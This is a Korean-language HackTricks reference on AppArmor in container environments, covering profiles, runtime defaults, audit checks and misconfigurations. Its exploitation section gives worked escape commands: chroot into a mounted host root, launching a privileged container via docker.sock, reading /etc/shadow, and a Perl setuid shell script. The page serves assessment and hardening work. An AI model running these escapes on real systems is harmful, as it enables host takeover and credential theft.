# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

AppArmor는 프로그램별 프로파일을 통해 제한을 적용하는 **강제 접근 제어** 시스템이다. 사용자와 그룹 소유권에 크게 의존하는 전통적인 DAC 검사와 달리, AppArmor는 커널이 프로세스 자체에 붙은 정책을 강제하도록 한다. 컨테이너 환경에서는 워크로드가 전통적인 권한으로는 작업을 시도할 수 있을 만큼 충분한 권한을 갖고 있어도 해당 AppArmor 프로파일이 관련 경로, 마운트, 네트워크 동작 또는 capability 사용을 허용하지 않으면 거부될 수 있기 때문에 이것이 중요하다.

가장 중요한 개념적 포인트는 AppArmor가 **경로 기반**이라는 것이다. SELinux가 레이블을 통해 접근을 판단하는 것과 달리, AppArmor는 경로 규칙으로 파일시스템 접근을 판단한다. 이는 접근하기 쉽고 강력하다는 장점이 있지만, bind mounts와 대체 경로 레이아웃에 주의를 기울여야 한다는 의미이기도 하다. 동일한 호스트 콘텐츠가 다른 경로로 접근 가능해지면 정책의 효과가 운영자가 처음 예상한 것과 달라질 수 있다.

## 컨테이너 분리에서의 역할

컨테이너 보안 검토는 종종 capabilities와 seccomp에서 멈추지만, 그 이후에도 AppArmor는 중요하다. 컨테이너가 있어서는 안 될 만큼 많은 권한을 갖고 있거나, 운영상 이유로 하나의 추가 capability가 필요한 워크로드를 상상해보라. AppArmor는 여전히 파일 접근, 마운트 동작, 네트워킹, 실행 패턴을 제한하여 명백한 악용 경로를 차단할 수 있다. 이 때문에 AppArmor를 "애플리케이션을 작동시키기 위해서만" 비활성화하는 것은 단순히 위험한 구성(configuration)을 적극적으로 악용 가능한 상태로 조용히 바꿀 수 있다.

## 실습

호스트에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 사용하라:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
현재 container process가 어떤 사용자로 실행되고 있는지 확인하려면:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
이 차이는 유용한 정보를 준다. 일반적으로 프로세스는 runtime이 선택한 profile에 연결된 AppArmor context를 보여야 한다. unconfined인 경우에는 그 추가적인 제한 계층이 사라진다.

또한 Docker가 적용했다고 판단하는 내용을 확인할 수 있다:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 런타임 사용

호스트가 이를 지원하면 Docker는 기본 또는 커스텀 AppArmor 프로파일을 적용할 수 있다. Podman도 AppArmor 기반 시스템에서 AppArmor와 통합할 수 있지만, SELinux 중심 배포판에서는 다른 MAC 시스템이 우선시되는 경우가 많다. Kubernetes는 실제로 AppArmor를 지원하는 노드에서 워크로드 수준으로 AppArmor 정책을 노출할 수 있다. LXC 및 Ubuntu 계열의 시스템 컨테이너 환경도 AppArmor를 광범위하게 사용한다.

실무적으로 중요한 점은 AppArmor가 "Docker 기능"이 아니라는 것이다. 이는 호스트 커널 기능이며 여러 런타임이 선택적으로 적용할 수 있다. 호스트가 이를 지원하지 않거나 런타임이 unconfined로 실행되도록 설정되면, 그 보호는 실질적으로 존재하지 않는다.

Kubernetes의 경우 현대적 API는 `securityContext.appArmorProfile`이다. Kubernetes `v1.30`부터는 이전의 베타 AppArmor 애노테이션이 더 이상 사용되지 않는다. 지원되는 호스트에서는 `RuntimeDefault`가 기본 프로파일이며, `Localhost`는 노드에 이미 로드되어 있어야 하는 프로파일을 가리킨다. 이는 매니페스트가 AppArmor를 인식하는 것처럼 보여도 여전히 노드 측 지원과 미리 로드된 프로파일에 전적으로 의존할 수 있기 때문에 검토 시 중요하다.

한 가지 미묘하지만 유용한 운영상의 세부사항은 `appArmorProfile.type: RuntimeDefault`를 명시적으로 설정하는 것이 해당 필드를 단순히 생략하는 것보다 더 엄격하다는 점이다. 필드를 명시적으로 설정했는데 노드가 AppArmor를 지원하지 않으면 승인은 실패해야 한다. 반면 필드를 생략하면 워크로드는 AppArmor가 없는 노드에서 여전히 실행될 수 있으며 단지 그 추가적인 격리 계층을 받지 못할 뿐이다. 공격자 관점에서는 매니페스트와 실제 노드 상태를 둘 다 확인할 좋은 이유가 된다.

Docker를 지원하는 AppArmor 호스트에서 가장 잘 알려진 기본 프로파일은 `docker-default`다. 그 프로파일은 Moby의 AppArmor 템플릿에서 생성되며, 일부 capability 기반 PoC가 기본 컨테이너에서 여전히 실패하는 이유를 설명해주므로 중요하다. 넓게 보면 `docker-default`는 일반적인 네트워킹을 허용하고 `/proc`의 많은 부분에 대한 쓰기를 거부하며 `/sys`의 민감한 부분에 대한 접근을 차단하고 마운트 작업을 차단하며 ptrace를 제한하여 일반적인 호스트 탐침용 프리미티브가 되지 않게 한다. 그 기본선을 이해하면 "컨테이너가 `CAP_SYS_ADMIN`을 가지고 있다"와 "컨테이너가 실제로 해당 권한을 내가 관심 있는 커널 인터페이스에 대해 사용할 수 있다"를 구분하는 데 도움이 된다.

## 프로파일 관리

AppArmor 프로파일은 보통 `/etc/apparmor.d/` 아래에 저장된다. 흔한 네이밍 규칙은 실행 파일 경로의 슬래시를 점으로 바꾸는 것이다. 예를 들어 `/usr/bin/man`에 대한 프로파일은 일반적으로 `/etc/apparmor.d/usr.bin.man`으로 저장된다. 활성 프로파일 이름을 알게 되면 호스트에서 해당 파일을 빠르게 찾을 수 있으므로, 이 세부사항은 방어와 평가 모두에서 중요하다.

유용한 호스트 측 관리 명령어로는 다음이 있다:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
이 명령어들이 컨테이너 보안 참조에서 중요한 이유는 프로파일이 실제로 어떻게 만들어지고 로드되며 complain mode로 전환되고 애플리케이션 변경 후에 어떻게 수정되는지를 설명해주기 때문이다. 운영자가 문제 해결 중에 프로파일을 complain mode로 옮겨두고 enforcement를 복원하는 것을 잊어버리는 습관이 있다면, 문서상으로는 컨테이너가 보호되는 것처럼 보이지만 실제로는 훨씬 느슨하게 동작할 수 있다.

### 프로파일 생성 및 업데이트

`aa-genprof`는 애플리케이션 동작을 관찰하고 대화형으로 프로파일을 생성하는 데 도움을 줄 수 있다:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` 는 나중에 `apparmor_parser` 로 로드할 수 있는 템플릿 프로파일을 생성할 수 있습니다:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
바이너리가 변경되어 정책을 업데이트해야 할 때, `aa-logprof`는 로그에서 발견된 거부 항목을 재생하여 운영자가 이를 허용할지 거부할지 결정하는 데 도움을 줄 수 있습니다:
```bash
sudo aa-logprof
```
### 로그

AppArmor 거부는 종종 `auditd`, syslog 또는 `aa-notify`와 같은 도구에서 확인할 수 있습니다:
```bash
sudo aa-notify -s 1 -v
```
이는 운영적·공격적 관점에서 유용합니다. 수비측은 이를 사용해 profiles를 세밀히 조정하고, 공격측은 어떤 정확한 경로나 동작이 거부되는지와 AppArmor가 exploit chain을 차단하는 제어인지 여부를 파악하는 데 사용합니다.

### 정확한 프로파일 파일 식별

runtime가 container에 대해 특정 AppArmor profile name을 표시할 때, 그 이름을 디스크상의 profile file로 매핑하는 것이 종종 유용합니다:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
이것은 특히 호스트 측 검토에서 유용합니다. "the container says it is running under profile `lowpriv`"와 "the actual rules live in this specific file that can be audited or reloaded" 사이의 간극을 메우기 때문입니다.

### 감사할 주요 규칙

프로필을 읽을 수 있을 때, 단순한 `deny` 라인에서 멈추지 마세요. 다음 몇 가지 규칙 유형은 AppArmor가 컨테이너 탈출 시도에 대해 얼마나 효과적인지에 실질적인 영향을 줍니다:

- `ux` / `Ux`: 대상 바이너리를 unconfined 상태로 실행합니다. 접근 가능한 helper, shell, 또는 interpreter가 `ux`로 허용되어 있다면, 보통 가장 먼저 테스트해볼 항목입니다.
- `px` / `Px` 및 `cx` / `Cx`: exec 시 프로필 전환을 수행합니다. 이것들이 자동으로 나쁜 것은 아니지만, 전환이 현재 프로필보다 훨씬 더 넓은 프로필로 이동할 수 있으므로 감사할 가치가 있습니다.
- `change_profile`: 작업이 즉시 또는 다음 exec 시 다른 로드된 프로필로 전환하도록 허용합니다. 만약 목적지 프로필이 더 약하다면, 이는 제한적인 도메인에서 벗어나는 의도된 탈출구가 될 수 있습니다.
- `flags=(complain)`, `flags=(unconfined)`, 또는 최신의 `flags=(prompt)`: 이는 해당 프로필에 대한 신뢰 수준을 바꿔야 합니다. `complain`은 차단을 시행하는 대신 로그를 기록하고, `unconfined`는 경계를 제거하며, `prompt`는 순수하게 커널이 강제하는 deny 대신 userspace의 결정 경로에 의존합니다.
- `userns` 또는 `userns create,`: 최신 AppArmor 정책은 user namespace 생성도 중재할 수 있습니다. 컨테이너 프로필이 이를 명시적으로 허용하면, 중첩된 user namespaces는 플랫폼이 AppArmor를 하드닝 전략의 일부로 사용하더라도 여전히 유효합니다.

Useful host-side grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
이런 종류의 감사는 수백 개의 일반 파일 규칙을 멍하니 바라보는 것보다 더 유용한 경우가 많다. 만약 breakout가 helper 실행, 새 namespace 진입, 또는 더 느슨한 profile로의 이스케이프에 의존한다면, 답은 종종 명백한 `deny /etc/shadow r` 스타일의 규칙들보다 이러한 전이(transition) 지향 규칙들에 숨어 있다.

## 잘못된 구성

가장 명백한 실수는 `apparmor=unconfined`이다. 관리자는 프로파일이 위험하거나 예기치 않은 동작을 올바르게 차단해서 애플리케이션이 실패했을 때 디버깅 목적으로 이를 설정하는 경우가 많다. 이 플래그가 프로덕션에 남아 있다면, 전체 MAC 계층이 사실상 제거된 것이다.

또 다른 미묘한 문제는 파일 권한이 정상으로 보인다고 bind mounts가 무해하다고 가정하는 것이다. AppArmor는 경로(path)-기반이기 때문에, 호스트 경로를 다른 마운트 위치 아래에 노출하면 경로 규칙과 나쁘게 상호작용할 수 있다. 세 번째 실수는 호스트 커널이 실제로 AppArmor를 강제하지 않는다면 설정 파일의 profile 이름은 거의 의미가 없다는 것을 잊는 것이다.

## 악용

AppArmor가 없으면 이전에 제약되었던 동작들이 갑자기 동작할 수 있다: bind mounts를 통해 민감한 경로를 읽기, 사용하기 더 어려워야 할 procfs나 sysfs의 일부에 접근하기, capabilities/seccomp가 허용한다면 마운트 관련 작업 수행하기, 또는 profile이 보통 거부할 경로를 사용하는 것 등이다. AppArmor는 종종 capability 기반의 breakout 시도가 문서상으로는 "작동해야" 하는데도 실제로 실패하는 이유를 설명하는 메커니즘이다. AppArmor를 제거하면 동일한 시도가 성공하기 시작할 수 있다.

만약 AppArmor가 path-traversal, bind-mount, 또는 마운트 기반의 악용 체인을 막는 주된 원인이라고 의심된다면, 첫 번째 단계는 보통 profile이 있을 때와 없을 때 무엇이 접근 가능한지 비교하는 것이다. 예를 들어, 호스트 경로가 컨테이너 내부에 마운트되어 있다면, 먼저 해당 경로를 traverse하고 읽을 수 있는지 확인하는 것으로 시작하라:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
컨테이너가 `CAP_SYS_ADMIN`과 같은 위험한 capability를 갖고 있다면, 가장 실용적인 테스트 중 하나는 AppArmor가 mount operations 또는 민감한 kernel filesystems에 대한 접근을 차단하는 제어인지 여부입니다:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
bind mount을 통해 host path가 이미 사용 가능한 환경에서는 AppArmor를 잃으면 read-only information-disclosure 문제가 호스트 파일에 대한 직접 접근으로 바뀔 수 있습니다:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
이 명령들의 요지는 AppArmor 단독으로 breakout을 만든다는 것이 아니다. AppArmor가 제거되면 많은 filesystem 및 mount-based abuse paths가 즉시 테스트 가능해진다는 점이다.

### 전체 예시: AppArmor 비활성화 + Host Root 마운트됨

이미 container에 host root가 `/host`에 bind-mounted되어 있다면, AppArmor를 제거함으로써 차단됐던 filesystem abuse path를 완전한 host escape로 바꿀 수 있다:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
일단 shell이 host filesystem을 통해 실행되면, workload는 사실상 container 경계를 탈출한 것입니다:
```bash
id
hostname
cat /etc/shadow | head
```
### 전체 예제: AppArmor 비활성화 + 런타임 소켓

실제 장벽이 런타임 상태를 둘러싼 AppArmor였다면, 마운트된 소켓은 완전한 탈출에 충분할 수 있습니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
정확한 경로는 마운트 지점에 따라 달라지지만, 최종 결과는 동일합니다: AppArmor는 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API는 호스트를 침해할 수 있는 container를 실행할 수 있습니다.

### 전체 예제: Path-Based Bind-Mount Bypass

AppArmor가 경로 기반이기 때문에, `/proc/**`를 보호한다고 해서 동일한 호스트 procfs 내용이 다른 경로를 통해 접근 가능할 때 자동으로 보호되는 것은 아닙니다:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
영향은 정확히 무엇이 마운트되었는지와 대체 경로가 다른 통제도 우회하는지에 따라 달라지지만, 이 패턴은 AppArmor를 단독으로 평가하는 대신 mount layout과 함께 평가해야 하는 가장 분명한 이유 중 하나이다.

### 전체 예: Shebang Bypass

AppArmor 정책은 때때로 인터프리터 경로를 표적으로 삼아 shebang 처리로 인한 스크립트 실행을 완전히 고려하지 못하는 경우가 있다. 과거 사례 중 하나는 스크립트의 첫 줄이 제한된 인터프리터를 가리키도록 하는 방식이었다:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
이러한 예시는 프로파일의 의도와 실제 실행 의미가 달라질 수 있다는 점을 상기시키는 데 중요합니다. 컨테이너 환경에서 AppArmor를 검토할 때는 인터프리터 체인과 대체 실행 경로에 특별한 주의를 기울여야 합니다.

## 점검

이 점검들의 목표는 세 가지 질문에 빠르게 답하는 것입니다: 호스트에서 AppArmor가 활성화되어 있는가, 현재 프로세스가 격리되어 있는가, 그리고 런타임이 실제로 이 컨테이너에 프로파일을 적용했는가?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
여기서 흥미로운 점:

- `/proc/self/attr/current`가 `unconfined`로 표시되면, 해당 워크로드는 AppArmor의 격리 혜택을 받지 못하고 있습니다.
- `aa-status`가 AppArmor가 비활성화되었거나 로드되지 않았음을 보여주면, 런타임 구성에 있는 어떤 프로파일 이름도 대부분 형식적입니다.
- `docker inspect`가 `unconfined` 또는 예상치 못한 커스텀 프로파일을 표시하면, 파일시스템이나 마운트 기반의 악용 경로가 성공하는 원인인 경우가 많습니다.
- `/sys/kernel/security/apparmor/profiles`에 기대한 프로파일이 없다면, 런타임이나 오케스트레이터 설정만으로는 충분하지 않습니다.
- 이른바 하드닝된 프로파일에 `ux`, 광범위한 `change_profile`, `userns`, 또는 `flags=(complain)` 같은 규칙이 포함되어 있다면, 실제 경계는 프로파일 이름이 암시하는 것보다 훨씬 약할 수 있습니다.

컨테이너가 운영상 이유로 이미 권한이 상승된 상태라면, AppArmor를 유지하는 것이 제한된 예외와 훨씬 광범위한 보안 실패 사이의 차이를 만드는 경우가 많습니다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 지원 호스트에서는 기본적으로 활성화됨 | 명시적으로 변경되지 않으면 `docker-default` AppArmor 프로파일을 사용함 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 호스트에 따름 | AppArmor는 `--security-opt`로 지원되지만, 정확한 기본값은 호스트/런타임에 따라 달라지며 Docker의 문서화된 `docker-default` 프로파일만큼 보편적이지 않습니다 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 조건부 기본값 | 만약 `appArmorProfile.type`가 지정되지 않으면 기본값은 `RuntimeDefault`이지만, 노드에서 AppArmor가 활성화된 경우에만 적용됩니다 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | 노드/런타임 지원을 따름 | 일반적으로 Kubernetes에서 지원되는 런타임은 AppArmor를 지원하지만, 실제 적용 여부는 노드 지원과 워크로드 설정에 따라 달라집니다 | Kubernetes 행과 동일; 직접 런타임 설정으로 AppArmor를 완전히 건너뛸 수도 있습니다 |

AppArmor의 경우 가장 중요한 변수는 종종 런타임뿐 아니라 **호스트**입니다. 매니페스트의 프로파일 설정만으로는 AppArmor가 활성화되지 않은 노드에서 격리를 생성하지 않습니다.

## 참고자료

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
